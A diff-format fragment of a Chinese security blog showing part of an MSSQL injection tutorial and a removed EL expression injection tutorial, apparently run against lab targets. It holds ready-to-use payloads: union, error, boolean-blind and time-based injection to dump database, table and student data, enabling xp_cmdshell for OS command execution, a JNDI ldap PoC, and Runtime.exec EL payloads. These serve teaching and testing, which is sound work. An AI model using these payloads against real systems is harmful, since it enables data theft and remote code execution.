+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 name from SchoolDB.dbo.sysobjects where xtype=&#x27;u&#x27;) --+ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282258075-d68d6a5b-27a6-49e3-b992-9c026270f216.png"></p>
+<p>查询第二条表名数据时，可以使用<code>and name != &#39;第一次输出中的表名&#39;</code>的方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 name from SchoolDB.dbo.sysobjects where xtype=&#x27;u&#x27; and name != &#x27;STUDENTS&#x27;) --+ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282277131-f0d9112d-7702-4c8c-80c0-3e567dd07eaf.png"></p>
+<p>获取列名，通过col_name、object_id等函数，遍历获取列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),1) from sysobjects)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),2) from sysobjects)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),3) from sysobjects)--+</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350362233-3bb50919-4dee-443d-a521-2cd26e378cfe.png"></p>
+<p>获取数据，这里获取StudentID字段的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS WHERE StudentID != 101)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS WHERE StudentID != 101 and StudentID != 102)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350783382-420b25f3-128f-4556-a68c-5f13562a33cb.png"></p>
+<h4 id="pnSUl">报错注入</h4>
+上面我们说过，MSSQL数据库是强类型语言数据库，当类型不一样时，会报错，配合子查询即可实现报错注入。可以利用的函数有以下这些：
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">convert() </span><br><span class="line">file_name() </span><br><span class="line">db_name() </span><br><span class="line">col_name() </span><br><span class="line">filegroup_name()</span><br><span class="line">object_name() </span><br><span class="line">schema_name() </span><br><span class="line">type_name() </span><br><span class="line">cast()</span><br></pre></td></tr></table></figure>
+
+<p>这里我们使用convert函数作为演示，convert函数语法如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONVERT(data_type(length),data_to_be_converted,style)</span><br><span class="line">--注释 ：</span><br><span class="line">data_type(length) 转换为⽬标数据类型（带有可选的长度）</span><br><span class="line">data_to_be_converted 含有需要转换的值</span><br><span class="line">style 规定⽇期/时间的输出格式（可省略）</span><br></pre></td></tr></table></figure>
+
+<p>对于<code>convert(int,@@version)</code>，convert函数会首先执行第二给参数指定的SQL查询，然后尝试将查询结果转为int类型。但是由于查询语句查询出来的结果时varchar类型，无法转为指定的int类型，因此convert函数会爆出一个SQLSever的错误消息，格式是<code>&quot;SQL查询结果&quot;无法转换为&quot;int&quot;类型</code>，这样攻击者就可以利用报错来获取到SQL的查询结果</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="keyword">convert</span>(<span class="type">int</span>,db_name())</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351877891-2432a32c-cfb1-4f2b-baf8-278e35bb21f1.png"></p>
+<p>除了使用函数以外，在两个不同类型的数据进行比较时，也会爆出SqlServer的错误信息，也是一种利用方法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name())</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351925683-be991476-3931-45a6-9e61-80ca7cab0cea.png"></p>
+<p>首先查询数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查询当前数据库</span><br><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name(<span class="number">0</span>))</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查询第二个数据库</span><br><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name(<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以通过<code>for xml path</code>，查询所有数据库的名字，<code>FOR XML PATH(&#39;&#39;)</code> 表示输出 XML，但不加任何标签。通常可以配合<code>stuff()</code>使用，用来拼接多个值并去除第一个多余分隔符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(name) from sys.databases for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749353320049-8a35d83b-9f4d-4d6b-8453-a046de1b53e5.png"></p>
+<p>爆出所有表名，但是其中存在一些系统表，可以通过<code>xtype=&#39;U&#39;</code>来过滤出用户表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(name) from sysobjects WHERE xtype = &#x27;U&#x27; for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358034266-f1ca5108-e55a-4bbf-a10a-7e9b28f04240.png"></p>
+<p>接下来就是爆出<code>Students</code>表的所有字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and  1=convert(int,stuff((select quotename(name) from SchoolDB.sys.columns where object_id=object_id(&#x27;Students&#x27;) for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)) --</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358196631-3425d161-db38-4843-875e-78d885791f7b.png"></p>
+<p>最后爆数据即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(StudentID) from Students for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358344892-388847df-803f-478d-9e43-f21c93308625.png"></p>
+<p>剩下的报错函数原理也是相似的，读者可以自行查阅资料</p>
+<h4 id="IeAWT">布尔盲注</h4>
+如果存在没有回显位 或者 不能直接通过页面返回内容查看数据库信息时，我们就可以通过布尔盲注去查询信息。页面会根据用户输入只回显true和flase，则可以通过构造逻辑判断来得到想要的信息
+
+<p>首先需要我们去判断是存在盲注，使用以下注入语句测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//正常回显</span><br><span class="line">SqlServer.php?id=101 and 1=1--+</span><br><span class="line">//不正常回显</span><br><span class="line">SqlServer.php?id=101 and 1=2--+</span><br></pre></td></tr></table></figure>
+
+<p>不管是对于数据库名、表名还是列名的盲注，流程都是相类似的</p>
+<p>首先猜解数据库名的长度，正常回显时，说明我们的判断是正确的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//回显正常</span><br><span class="line">SqlServer.php?id=101 and len((select db_name()))=8--+</span><br><span class="line">//不正常回显</span><br><span class="line">SqlServer.php?id=101 and len((select db_name()))=4--+</span><br></pre></td></tr></table></figure>
+
+<p>猜解数据库名字，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//获取数据库名的第一个字符ascii码为83</span><br><span class="line">SqlServer.php?id=101 and ascii(substring((select db_name()),1,1))=83 -- </span><br><span class="line">//获取数据库名的第一个字符ascii码为99</span><br><span class="line">SqlServer.php?id=101 and ascii(substring((select db_name()),1,1))=99 -- </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359514500-d4417e71-1035-4e8e-8349-26516dccc2e8.png"></p>
+<p>后续的表名、列名和数据，只需要替换响应的SQL语句即可</p>
+<h4 id="KxKAK">延时注入</h4>
+这里主要是使用`WAITFOR DELAY '0:0:n'`这个语句表示要延迟几秒，他的作用就是等待待定时间，然后再执行后续语句。如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有延迟，渗透测试⼈员就可以判断网站是否存在注⼊漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测⽅法。
+
+<p>利用该注入语句，可以判断此处是否存在延时注入</p>
+<p>观察浏览器f12，观察时间确认成功延时，代表存在漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 WAITFOR DELAY &#x27;0:0:5&#x27; --</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359997217-3ebd3e53-c8bb-4bfe-ac61-f51a6f57347e.png"></p>
+<p>后续利用和布尔注入相类似，判断数据库名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 if (len((select db_name()))=8) WAITFOR DELAY &#x27;0:0:5&#x27; --+ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360255270-e63390ae-72d1-46a3-ad5e-13a58a6b6e05.png"></p>
+<p>然后一个字符一个字符进行猜解数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 if (ascii(substring((select db_name()),1,1))=83) WAITFOR DELAY &#x27;0:0:5&#x27;-- </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360227353-a350a9b9-fe3d-41f9-b34e-c424b1bb1b56.png"></p>
+<p>后续只需要替换SQL语句查询点，就可以注入其他数据</p>
+<h2 id="zxVml">SqlServer命令执行</h2>
+MSSQL数据库中，存在`xp_cmdshell`函数：SQL中运行系统命令行的系统存储过程，允许 SQL Server 以服务账户的身份执行 Windows 命令或外部程序。如果该命令开启时，我们就可以执行系统命令。
+
+<p>我们现在在判断了网站权限是<code>sa</code>权限后，想要执行系统命令，就先要判断<code>xp_cmdshell</code>是否存在，当页面正常返回时，说明该命令是开启的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=(select count(*) from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name = &#x27;xp_cmdshell&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><code>xp_cmdshell</code>默认在mssql2000中是开启的，在mssql2005后版本默认禁止。2005的<code>xp_cmdshell</code>的权限一般是<code>system</code>，而2008多数为<code>nt authority\network service</code></p>
+<p>但是如果有管理员<code>sa</code>权限，则可以用<code>sp_configure</code>重新开启</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">开启 xp_cmdshell：</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;</span><br><span class="line">关闭 xp_cmdshell：</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;, 0;reconfigure</span><br></pre></td></tr></table></figure>
+
+<p>可以使用堆叠的方式进行执行命令，但是有些命令的执行需要较高权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 ;exec master..xp_cmdshell &quot;命令&quot;</span><br></pre></td></tr></table></figure>
+
+<p>通过运行<code>whoami</code>，可以看到sqlserver的权限为<code>nt service\mssqlserver</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749362631456-529373c6-eb7f-4ed3-81ec-434d7ed409e5.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -2532,206 +2897,6 @@ org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;</span>, <span class="string">&quot;tmJndiName&quot;</span>: <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;tmFromJndi&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;transactionManager&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.transactionManager&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/03/23/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Sean">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="肖恩的博客">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 肖恩的博客">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/03/23/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">EL表达式注入</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2025-03-23 14:16:27" itemprop="dateCreated datePublished" datetime="2025-03-23T14:16:27+08:00">2025-03-23</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-03-25 11:14:38" itemprop="dateModified" datetime="2025-03-25T11:14:38+08:00">2025-03-25</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="LcMib"> EL表达式注入</h1>
-
-<p>今天来学习<strong>EL表达式注入</strong></p>
-<h2 id="hKZSz">前置基础</h2>
-EL（全称 Expression Language）表达式语言
-
-<p><strong>作用</strong>：</p>
-<ul>
-<li>简化JSP页面内的Java代码</li>
-<li>主要作用为 **获取数据 。**从域中获取数据，然后将数据展示出来</li>
-</ul>
-<p><strong>用法</strong>：</p>
-<p>使用的前提是通过page标签设置不忽略EL表达式</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> isELIgnored=<span class="string">&quot;false&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>基础操作符：</strong></p>
-<p>这里我们列出来几个较为重要的算术和逻辑操作符</p>
-<table>
-<thead>
-<tr>
-<th><strong><font style="color:rgb(79, 79, 79);">操作</font><strong><strong><font style="color:rgb(79, 79, 79);"></font></strong></strong><font style="color:rgb(79, 79, 79);">符</font></strong></th>
-<th><strong>描述</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>.</strong></td>
-<td><strong>访问一个Bean属性或者一个映射条目 ${param.order}</strong></td>
-</tr>
-<tr>
-<td><strong>[]</strong></td>
-<td><strong>访问一个数组或者链表的元素 ${param[“order”]}</strong></td>
-</tr>
-<tr>
-<td><strong>()</strong></td>
-<td><strong><font style="color:rgb(79, 79, 79);">组织一个子表达式以改变优先级</font></strong></td>
-</tr>
-</tbody></table>
-<p><strong>语法</strong>：</p>
-<p>EL表达式的用法为<code>$&#123;expression&#125;</code></p>
-<p>例如<code>$&#123;&lt;font style=&quot;color:rgb(102, 102, 102);&quot;&gt;userinfo&lt;/font&gt;&#125;</code>代表从<strong>域</strong>中获取变量userinfo的值</p>
-<p>而JSP中存在四大域，分别为</p>
-<ul>
-<li>page：当前页面有效</li>
-<li>request：当前请求有效</li>
-<li>session：当前会话有效</li>
-<li>application：当前应用有效</li>
-</ul>
-<p>EL表达式获取数据时，依次从以上四个域中获取，直到寻找到该变量（若没有找到则返回<code>&quot;&quot;</code>）</p>
-<p>有些双亲委派的味道</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740315963564-41831cab-f3b0-4b98-8f81-fbfd327354f7.png"></p>
-<h2 id="lmwyA">EL表达式漏洞注入</h2>
-<h3 id="H87dn">漏洞原理</h3>
-
-<p>EL表达式注入漏洞的漏洞原理是：<strong>表达式外部可控</strong>导致攻击者注入恶意表达式从而实现任意代码执行，SpEL、OGNL等表达式注入也是一样的漏洞原理</p>
-<p>一般来说，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是外部获取的</p>
-<h3 id="w7Oa7">通用的Poc</h3>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span></span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Web路径</span></span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="string">&quot;&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件头参数</span></span><br><span class="line">$&#123;header&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取webRoot</span></span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行命令</span></span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&quot;a&quot;</span>,pageContext.request.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;calc&quot;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="ciMuc">简单的漏洞利用</h3>
-当存在一个参数`X`可控时，可以插入到JSP页面中
-
-<p>我们将参数<code>X</code>设为以下payload</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>.getClass()).invoke(<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>),<span class="string">&quot;calc.exe&quot;</span>))&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740316893442-a754804b-9d63-458f-9a63-c56996f962c0.png"></p>
-<p>当我们访问JSP页面时，服务端就会解析构造的恶意EL表达式，从而造成EL表达式注入</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740316837775-976bcbeb-edab-4a8f-95cb-cdddc4b31629.png"></p>
-<p>在实际的应用场景中，几乎没有也无法直接从外部控制JSP页面中的EL表达式的。而且目前已知的EL表达式注入漏洞都是框架层面服务端执行的EL表达式外部可控导致的</p>
-<h4 id="简单漏洞场景之-CVE-2011-2730">简单漏洞场景CVE-2011-2730</h4>
-参考链接：[https://juejin.cn/post/6844903572077838350](https://juejin.cn/post/6844903572077838350)
-
-<p>正常情况下使用message标签，text属性使用EL表达式从请求中取值</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib uri=<span class="string">&quot;http://www.springframework.org/tags&quot;</span> prefix=<span class="string">&quot;spring&quot;</span>%&gt;</span><br><span class="line">&lt;spring:message  text=<span class="string">&quot;$&#123;param.a&#125;&quot;</span>&gt;&lt;/spring:message&gt;</span><br></pre></td></tr></table></figure>
-
-<p>当我们访问以下url时候，<code>$&#123;applicationScope&#125;</code>就会被当作EL表达式执行</p>
-<p>我们改变EL表达式的内容，就可以达到其他目的</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/tag.jsp?a=$&#123;applicationScope&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740319136298-9186af5c-ffcc-4abf-8c85-ea48d8692b3e.png"></p>
-<h2 id="IdSDB">EL表达式的EXP与基础绕过</h2>
-<h3 id="XsqTV">基础EXP</h3>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;&#x27;</span>.getClass()).invoke(<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="string">&#x27;getRuntime&#x27;</span>).invoke(<span class="literal">null</span>),<span class="string">&#x27;calc.exe&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Pqy5s">利用 ScriptEngine 调用 JS 引擎绕过</h3>
-引用drun1baby师傅的博客
-
-<blockquote>
-<p><font style="color:rgb(80, 80, 92);">EL 曾经是</font><font style="color:rgb(80, 80, 92);"> </font><code>JSTL</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">的一部分。然后，EL 进入了 JSP 2.0 标准。现在，尽管是 JSP 2.1 的一部分，但 EL API 已被分离到包</font><font style="color:rgb(80, 80, 92);"> </font><code>javax.el</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">中， 并且已删除了对核心 JSP 类的所有依赖关系。换句话说：EL 已准备好在非 JSP 应用程序中使用！</font></p>
-<p><font style="color:rgb(80, 80, 92);">也就是说，现在 EL 表达式所依赖的包</font><font style="color:rgb(80, 80, 92);"> </font><code>javax.el</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">等都在</font><font style="color:rgb(80, 80, 92);"> </font><code>JUEL</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">相关的 jar 包中。</font></p>
-<p><font style="color:rgb(80, 80, 92);">JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。</font></p>
-<p><font style="color:rgb(80, 80, 92);">需要的 jar 包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7</font></p>
-</blockquote>
-<p>在pom.xml中导入依赖</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;juel-impl&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.7</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;juel-api&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.7</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;juel-spi&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.7</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
-
-<p>运行后，通过反射调用<code>Runtime</code>类，成功执行恶意代码</p>
